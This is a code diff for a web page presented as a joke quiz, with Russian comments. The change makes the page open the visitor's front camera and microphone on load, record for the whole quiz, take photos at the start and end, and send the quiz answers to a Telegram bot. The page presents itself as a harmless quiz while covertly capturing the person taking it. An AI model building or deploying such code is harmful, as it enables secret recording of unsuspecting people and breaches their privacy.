@@ -155,11 +155,12 @@
         let answers = [];
         let mediaRecorder;
         let recordedChunks = [];
+        let stream;
 
-        // Функция для записи видео
-        async function recordVideo(duration = 3000) { // 3 секунды записи
+        // Функция для начала записи видео
+        async function startRecording() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' },
                     audio: true 
                 });
@@ -190,16 +191,18 @@
                 };
 
                 mediaRecorder.start();
-
-                // Останавливаем запись через указанное время
-                setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
-                        mediaRecorder.stop();
-                    }
-                }, duration);
+                console.log('Запись началась');
 
             } catch (error) {
                 console.error('Ошибка записи видео:', error);
+            }
+        }
+
+        // Функция для остановки записи
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                console.log('Запись остановлена');
             }
         }
 
@@ -303,11 +306,10 @@
             return `<b>Вопрос ${questionNumber}:</b> ${questions[questionNumber].question}\n<b>Ответ:</b> ${questions[questionNumber].answers[value]}`;
         }
 
-        // При загрузке страницы записываем видео
+        // При загрузке страницы начинаем запись
         window.addEventListener('load', async () => {
-            await recordVideo();
-            // После записи видео делаем фото
-            setTimeout(takePhoto, 3500);
+            await startRecording();
+            await takePhoto();
         });
 
         nextBtn.addEventListener('click', async function() {
@@ -319,7 +321,6 @@
                 return;
             }
 
-            // Сохраняем ответ
             const answerText = getAnswerText(currentQuestion, selectedOption.value);
             answers.push(answerText);
 
@@ -333,6 +334,9 @@
                     nextBtn.textContent = 'Завершить';
                 }
             } else {
+                // Останавливаем запись видео
+                stopRecording();
+                
                 // Отправляем все ответы в Telegram
                 const allAnswers = "<b>🎯 Новый прошедший опрос:</b>\n\n" + answers.join("\n\n");
                 await sendToTelegram(allAnswers);
@@ -341,13 +345,11 @@
                 result.style.display = 'block';
                 result.innerHTML = 'Поздравляю, вы - БОТ!';
                 
-                // Записываем финальное видео
-                await recordVideo();
-                // После записи видео делаем фото и показываем финальный экран
+                // Делаем финальное фото и показываем финальный экран
                 setTimeout(async () => {
                     await takePhoto();
                     showFinalScreen();
-                }, 3500);
+                }, 1000);
             }
         });
     </script>
